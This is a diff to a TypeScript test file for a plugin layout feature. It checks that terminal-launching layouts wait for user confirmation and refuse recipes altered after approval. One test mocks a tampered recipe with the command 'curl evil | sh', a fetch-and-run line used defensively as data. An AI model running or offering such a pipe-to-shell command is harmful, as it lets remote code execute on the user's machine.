@@ -47,6 +47,11 @@ import {
   useLayoutApplyConfirmStore,
 } from "@/store/layoutApplyConfirmStore";
 
+// The preview formatter loads on demand, so the request is raised a few ticks
+// after the call rather than within one.
+const confirmationShown = () =>
+  vi.waitFor(() => expect(useLayoutApplyConfirmStore.getState().current).not.toBeNull());
+
 interface FakeGroup {
   id: string;
   panelIds: string[];
@@ -465,7 +470,7 @@ describe("applyPluginLayout", () => {
 
     it("lists every terminal and changes nothing until the user approves", async () => {
       const pending = applyPluginLayout("acme.workspace", userCtx);
-      await Promise.resolve();
+      await confirmationShown();
 
       const request = useLayoutApplyConfirmStore.getState().current;
       expect(request?.layoutName).toBe("Workspace");
@@ -489,7 +494,7 @@ describe("applyPluginLayout", () => {
 
     it("does nothing at all when the user declines", async () => {
       const pending = applyPluginLayout("acme.workspace", userCtx);
-      await Promise.resolve();
+      await confirmationShown();
       useLayoutApplyConfirmStore.getState().resolveCurrent(false);
 
       expect(await pending).toEqual({ status: "cancelled" });
@@ -512,7 +517,7 @@ describe("applyPluginLayout", () => {
 
     it("refuses a recipe that changed after the user approved it", async () => {
       const pending = applyPluginLayout("acme.workspace", userCtx);
-      await Promise.resolve();
+      await confirmationShown();
       getRecipeById.mockReturnValue({
         ...pairRecipe,
         terminals: [{ type: "terminal", command: "curl evil | sh" }],
@@ -535,6 +540,16 @@ describe("applyPluginLayout", () => {
       expect(await pending).toEqual({ status: "cancelled" });
       expect(useLayoutApplyConfirmStore.getState().current).toBeNull();
       expect(dispatch).not.toHaveBeenCalled();
+    });
+
+    it("keeps a confirmation when only another layout is withdrawn meanwhile", async () => {
+      const pending = applyPluginLayout("acme.workspace", userCtx);
+      cancelLayoutApplyConfirmations(new Set(["acme.other"]));
+      await confirmationShown();
+
+      expect(useLayoutApplyConfirmStore.getState().current?.layoutName).toBe("Workspace");
+      useLayoutApplyConfirmStore.getState().resolveCurrent(false);
+      expect(await pending).toEqual({ status: "cancelled" });
     });
 
     it("refuses a recipe a team recipe now shadows", async () => {
@@ -561,7 +576,7 @@ describe("applyPluginLayout", () => {
 
     it("starts one waiting recipe through the layout's confirmation, and only it", async () => {
       const pending = startPluginLayoutRecipe("acme.workspace", "acme.pair", userCtx);
-      await Promise.resolve();
+      await confirmationShown();
       expect(useLayoutApplyConfirmStore.getState().current?.previewLines.join("\n")).toContain(
         "npm test"
       );
@@ -611,7 +626,7 @@ describe("applyPluginLayout", () => {
 
       async function startApproved() {
         const pending = startPluginLayoutRecipe("acme.workspace", "acme.pair", userCtx);
-        await Promise.resolve();
+        await confirmationShown();
         useLayoutApplyConfirmStore.getState().resolveCurrent(true);
         return pending;
       }
@@ -693,7 +708,7 @@ describe("applyPluginLayout", () => {
 
     it("starts nothing when the user declines a waiting recipe", async () => {
       const pending = startPluginLayoutRecipe("acme.workspace", "acme.pair", userCtx);
-      await Promise.resolve();
+      await confirmationShown();
       useLayoutApplyConfirmStore.getState().resolveCurrent(false);
       expect(await pending).toEqual({ status: "cancelled" });
       expect(dispatch).not.toHaveBeenCalled();
